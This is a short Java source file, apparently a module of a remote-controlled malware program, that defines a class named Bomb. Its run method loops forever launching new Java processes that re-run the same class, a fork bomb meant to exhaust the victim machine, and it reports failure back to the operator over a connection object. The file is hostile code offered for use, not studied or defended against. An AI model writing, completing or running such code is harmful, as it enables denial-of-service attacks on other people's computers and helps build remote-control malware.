package main;

import java.io.IOException;

public class Bomb implements Runnable {
    private Connection connection;

    public Bomb(Connection conn) {
        this.connection = conn;
    }

    @Override
    public void run() {
        try {
            while (true)
                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "main.Bomb"});
        } catch (IOException e) {
            connection.sendMessage(new Message("bomb-fail", e.getMessage()));
            e.printStackTrace();
        }
    }
}